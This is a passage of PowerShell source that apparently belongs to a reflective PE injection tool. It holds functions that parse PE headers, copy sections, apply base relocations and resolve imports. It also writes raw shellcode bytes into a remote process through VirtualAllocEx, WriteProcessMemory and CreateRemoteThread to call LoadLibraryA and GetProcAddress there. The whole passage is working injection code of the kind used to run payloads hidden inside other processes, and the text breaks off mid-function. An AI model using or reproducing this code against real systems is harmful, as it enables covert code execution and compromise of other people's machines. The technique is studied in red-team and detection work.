        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }

        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $PEInfo = New-Object System.Object

        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null

        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types

        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)

        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }

        $PEInfo = New-Object System.Object

        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types

        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }

        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }

        return $PEInfo
    }

    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)

        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }

            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem

            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }

            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }

            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }

        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $DllAddress
    }

    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,

        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }

        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }

        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem

        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)

        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }

        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }

        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }

        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)

            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))

            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }

            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }

            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }

            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)

        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }

        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])

                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }

            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )

        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)

                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
